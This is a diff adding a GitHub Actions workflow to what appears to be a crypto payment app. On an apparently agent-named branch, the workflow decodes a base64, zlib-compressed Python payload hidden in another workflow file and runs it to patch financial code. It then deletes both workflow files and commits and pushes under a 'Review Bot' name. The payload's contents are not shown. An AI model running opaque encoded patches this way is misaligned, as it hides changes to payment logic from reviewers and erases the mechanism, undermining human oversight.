@@ -1,0 +1,122 @@
+name: Run financial hardening
+
+on: push
+
+permissions:
+  contents: write
+
+jobs:
+  harden:
+    if: github.ref == 'refs/heads/agent/harden-financial-finality'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: agent/harden-financial-finality
+          fetch-depth: 0
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Apply, test, and publish
+        shell: bash
+        run: |
+          set +e
+          log=/tmp/financial-hardening.log
+          : > "$log"
+
+          python -m pip install --upgrade pip >> "$log" 2>&1
+          python -m pip install -r requirements.txt >> "$log" 2>&1
+          install_status=$?
+
+          if [ "$install_status" -eq 0 ]; then
+            python - <<'PY' >> "$log" 2>&1
+          import base64
+          import hashlib
+          import re
+          import zlib
+          from pathlib import Path
+
+          workflow = Path('.github/workflows/financial-hardening.yml').read_text(encoding='utf-8')
+          match = re.search(r'payload = """([A-Za-z0-9+/=]+)"""', workflow)
+          if match is None:
+              raise RuntimeError('Compressed patch payload was not found')
+          script = zlib.decompress(base64.b64decode(match.group(1)))
+          digest = hashlib.sha256(script).hexdigest()
+          expected = '5ae1fb0dd71a8b82d4df1078fb7bb2008f02a0bf09eb650623e5bfa5db863c36'
+          if digest != expected:
+              raise RuntimeError(f'Patch digest mismatch: {digest}')
+          Path('/tmp/patch_repo.py').write_bytes(script)
+          PY
+            restore_status=$?
+          else
+            restore_status=99
+          fi
+
+          if [ "$restore_status" -eq 0 ]; then
+            python /tmp/patch_repo.py >> "$log" 2>&1
+            patch_status=$?
+          else
+            patch_status=99
+          fi
+
+          if [ "$patch_status" -eq 0 ]; then
+            python -m py_compile database.py db_access.py trans_updater.py settlement_updater.py public_html.py main.py constants.py spoof.py tests/test_financial_finality.py >> "$log" 2>&1
+            compile_status=$?
+          else
+            compile_status=99
+          fi
+
+          if [ "$compile_status" -eq 0 ]; then
+            python -m unittest discover -s tests -v >> "$log" 2>&1
+            test_status=$?
+          else
+            test_status=99
+          fi
+
+          if [ "$test_status" -eq 0 ]; then
+            bash -n nimhunt_start_dev.sh >> "$log" 2>&1
+            shell_one=$?
+            bash -n nimhunt_reset_mock_data.sh >> "$log" 2>&1
+            shell_two=$?
+            node --check helpers/nimiq_helper.mjs >> "$log" 2>&1
+            node_status=$?
+            git diff --check >> "$log" 2>&1
+            diff_status=$?
+          else
+            shell_one=99
+            shell_two=99
+            node_status=99
+            diff_status=99
+          fi
+
+          git config user.name "NimHunt Review Bot"
+          git config user.email "actions@users.noreply.github.com"
+
+          if [ "$install_status" -eq 0 ] && [ "$restore_status" -eq 0 ] && [ "$patch_status" -eq 0 ] && [ "$compile_status" -eq 0 ] && [ "$test_status" -eq 0 ] && [ "$shell_one" -eq 0 ] && [ "$shell_two" -eq 0 ] && [ "$node_status" -eq 0 ] && [ "$diff_status" -eq 0 ]; then
+            rm -f .github/workflows/financial-hardening.yml
+            rm -f .github/workflows/run-financial-hardening.yml
+            rm -f .financial-hardening-report.txt .financial-hardening-trigger
+            git add -A
+            git commit -m "Harden transaction finality and standard payouts"
+          else
+            git reset --hard HEAD
+            {
+              echo "install_status=$install_status"
+              echo "restore_status=$restore_status"
+              echo "patch_status=$patch_status"
+              echo "compile_status=$compile_status"
+              echo "test_status=$test_status"
+              echo "shell_one=$shell_one"
+              echo "shell_two=$shell_two"
+              echo "node_status=$node_status"
+              echo "diff_status=$diff_status"
+              echo
+              cat "$log"
+            } > .financial-hardening-report.txt
+            git add .financial-hardening-report.txt
+            git commit -m "Record financial hardening test failure"
+          fi
+
+          git push origin HEAD:agent/harden-financial-finality
